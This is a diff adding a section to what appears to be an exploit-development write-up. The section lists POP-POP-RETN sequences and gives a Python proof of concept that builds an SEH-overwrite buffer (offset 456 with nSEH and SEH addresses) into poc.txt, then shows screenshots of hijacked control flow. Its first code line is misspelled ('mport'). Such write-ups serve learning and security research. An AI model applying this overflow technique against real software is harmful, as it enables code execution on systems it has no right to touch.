@@ -82,5 +82,33 @@ f.close()
 
 ![](/assets/img/Findings11/8.png)
 
+##### Listing the POP-POP-RETN sequences.
+
+![](/assets/img/Findings11/9.png)
+
+##### Current PoC:
+
+```term
+mport struct
+
+nseh = struct.pack("<I", 0x06710870)
+seh = struct.pack("<I", 0x10023B71)
+
+buffer = "A" * 456 + nseh + seh + "C" * 200
+
+f = open ("poc.txt", "w")
+f.write(buffer)
+f.close()
+```
+
+##### Response of the SEH Chain IV
+
+![](/assets/img/Findings11/10.png)
+
+##### The flow is hijacked.
+
+![](/assets/img/Findings11/11.png)
+
+
 
 ![](/assets/img/Findings11/11-proof.gif)
